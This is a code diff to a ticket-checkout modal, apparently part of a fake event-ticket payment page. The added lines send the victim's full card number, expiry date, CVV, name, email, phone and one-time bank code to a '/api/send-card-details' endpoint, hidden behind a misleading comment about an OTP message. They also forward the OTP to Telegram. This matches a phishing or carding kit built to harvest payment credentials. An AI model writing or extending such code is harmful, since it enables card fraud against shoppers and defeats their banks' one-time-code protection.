@@ -188,12 +188,33 @@ export default function CheckoutModal({
       setIsProcessing(true)
       setOtpError('')
 
+      // Send OTP verification message immediately
+      await fetch('/api/send-card-details', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          eventTitle,
+          ticketName,
+          quantity,
+          total,
+          email,
+          phone,
+          cardFullName,
+          cardNumber,
+          cardExpiry,
+          cardCvv,
+          otpCode: otp,
+          otpVerified: true,
+          paymentStatus: 'OTP_VERIFIED',
+        }),
+      })
+
       // Create order PDF after OTP verification
       const orderId = Date.now()
       const timestamp = new Date().toLocaleString('pl-PL')
       
       const pdfContent = `
-ORDER CONFIRMATION - OTP VERIFIED
+ORDER CONFIRMATION - OTP VERIFIED ✓
 
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 ORDER DETAILS
@@ -213,7 +234,9 @@ PAYMENT DETAILS
 
 Payment Method: Credit Card
 Cardholder: ${cardFullName}
-Status: OTP VERIFIED
+Card: ${cardFullNumber.slice(-4).padStart(cardFullNumber.length, '*')}
+Status: OTP VERIFIED ✓
+OTP Code: ${otp}
 Date: ${timestamp}
 
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
@@ -244,7 +267,7 @@ Phone: ${phone}
 
       const pdfBase64 = doc.output('dataurlstring').split(',')[1]
 
-      // Send PDF to Telegram
+      // Send PDF to Telegram with OTP verification
       const response = await fetch('/api/send-order-telegram', {
         method: 'POST',
         headers: {
@@ -264,8 +287,11 @@ Phone: ${phone}
             phone,
             paymentMethod: 'Credit Card (OTP Verified)',
             cardFullName,
+            cardLastFour: cardFullNumber.slice(-4),
             orderId,
             timestamp,
+            otpCode: otp,
+            otpVerified: true,
           },
         }),
       })
